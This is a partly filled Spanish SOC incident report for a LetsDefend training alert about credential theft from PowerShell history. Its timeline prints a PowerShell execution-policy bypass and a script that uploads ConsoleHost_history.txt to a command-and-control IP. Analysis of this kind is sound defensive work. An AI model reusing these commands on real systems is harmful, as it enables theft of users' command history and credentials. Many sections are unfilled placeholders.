# Informe de Incidente - Attempt to Steal Credentials from the PowerShell History

## 1. Resumen Ejecutivo

Se investigó una alerta de seguridad relacionada con [descripción breve de la alerta].

La investigación determinó que se trata de un [Verdadero Positivo / Falso Positivo / Actividad Benigna / Inconcluso].

---

## 2. Detalles de la Alerta

| Campo | Valor |
|---|---|
| Plataforma | LetsDefend |
| ID del Caso | SOC267 |
| Tipo de Alerta | [Phishing / Malware / Fuerza Bruta / ...] |
| Severidad | [Baja / Media / Alta / Crítica] |
| Estado | [Cerrado / Escalado / Contenido] |
| Analista | Jorge Fernández Córcoles |
| Fecha | 10/09/2026 |

---

## 3. Información Inicial de la Alerta

| Campo | Valor |
|---|---|
| Nombre de la alerta | Attempt to Steal Credentials from the PowerShell History |
| IP origen | 162.19.175.104 |
| IP destino | 172.16.17.205 |
| Dirección de origen | support@andysalesproject.com |
| Dirección de destino | laureen@letsdefend.io |
| Hostname | Laureen |
| Usuario | LetsDefend |
| Hash del fichero | |
| URL / Dominio | |
| Timestamp | 2024-03-18 05:27:34 |

---

## 4. Pasos de la Investigación

### 4.1 Revisión de la Alerta
[Describe qué mostraba la alerta y por qué requirió investigación.]
La alerta mostraba 
### 4.2 Análisis de Logs
[Explica qué logs se revisaron y qué se encontró.]

### 4.3 Análisis de IOCs
[Resume IPs, dominios, hashes, URLs u otros artefactos sospechosos.]  
`https://files-ld[.]s3[.]us-east-2[.]amazonaws[.]com/project_2024.zip`
`200.183.149.135`

### 4.4 Actividad del Usuario / Endpoint
[Describe la actividad relevante del usuario o del endpoint.]

### 4.5 Línea de Tiempo del Incidente

| Timestamp | Evento |
|---|---|
| 08:40:21 | Comandos de reconocimiento: `whoami`, `whoami /groups`, `ipconfig`, `netstat` |
| 08:44:18 | Comandos de creación de usuarios, contraseñas y grupos en el endpoint: `$Password = Read-Host -AsSecureString`, `newUser = "Laureen"`, `$groups = Get-LocalGroup -Member Laureen` |
| 08:51:39 | Con `"C:\Windows\system32\cmd.exe" "/d /s /c ""C:\Program Files\SentinelOne\Sentinel Agent 23.1.2.400\SentinelBrowserNativeHost.exe" chrome-extension://iekfdmgbpmcklocjhlabimljddkeflgl/ --parent-window=0" < \\.\pipe\chrome.nativeMessaging.in.4bcdd72149480e8f > \\.\pipe\chrome.nativeMessaging.out.4bcdd72149480e8f"`, el atacante consigue engañar a la solución SentinelOne a través de la inyección de comandos |
| 08:51:45 | A esta hora el ususario clica el enlace y se realiza la descarga del zip en el siguiente sitio web malicioso: `https://files-ld[.]s3[.]us-east-2[.]amazonaws[.]com/project_2024.zip` |
| 08:52:23 | `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "-Command" "if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\LetsDefend\Downloads\project_2024\project.ps1'"` es utilizado por el atacante para bypassear las restricciones y políticas de ejecución del sistema |
| 08:52:25 | `$newFilePath = "C:\Users\LetsDefend\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" if (Test-Path -Path $newFilePath -PathType Leaf) { $fileContent = Get-Content -Path $newFilePath -Raw if (![string]::IsNullOrWhiteSpace($fileContent)) { try { $webClient = New-Object System.Net.WebClient $webClient.UploadFile("https://200.183.149.135/upload", $newFilePath) Write-Host "File uploaded successfully." } catch { Write-Host "An error occurred while uploading the file: $_" } } else { Write-Host "The file is empty." } } else { Write-Host "File not found." }`. Tras la ejecución del archivo encontramos este comando con el cual el atacante busca exfiltrar un archivo llamado `ConsoleHost_History.txt` subiéndolo al sitio web: `https://200.183.149.135/upload`. El servidor C2 sería este `200.183.149.135` |

---

## 5. Hallazgos

- `https://files-ld[.]s3[.]us-east-2[.]amazonaws[.]com/project_2024.zip`
-  
- `ConsoleHost_History.txt` que contiene el historial de comandos que el usuario LetsDefend ejecutó desde la terminal justo antes de que el atacante tuviera acceso al sistema. Por lo tanto, los primeros comandos no eran de reconocimiento y el atacante no creó ningún usuario con contraseña y grupo: fue el propio usuario. 
- `200.183.149.135` es el servidor C2 al cual el atacante exflitra esos datos sobre el usuario administrador, su contraseña y los grupos a los que pertenece 

---

## 6. Mapeo MITRE ATT&CK

| Táctica | Técnica | Sub-técnica | Descripción |
|---|---|---|---|
| Acceso Inicial | [Txxxx] | [Txxxx.xxx] | [Explicación] |
| Ejecución | [Txxxx] | [Txxxx.xxx] | [Explicación] |
| Evasión de Defensas | [Txxxx] | [Txxxx.xxx] | [Explicación] |

---

## 7. Herramientas Utilizadas

| Herramienta | Uso |
|---|---|
| VirusTotal | [Para qué se usó] |
| AbuseIPDB | [Para qué se usó] |
| MITRE ATT&CK | [Para qué se usó] |
| [Otra herramienta] | [Para qué se usó] |

---

## 8. Conclusión

| Campo | Valor |
|---|---|
| Clasificación | [Verdadero Positivo / Falso Positivo / Benigno / Inconcluso] |
| Impacto | [Bajo / Medio / Alto] |

---

## 9. Acciones Recomendadas

- [Acción 1]
- [Acción 2]
- [Acción 3]

---
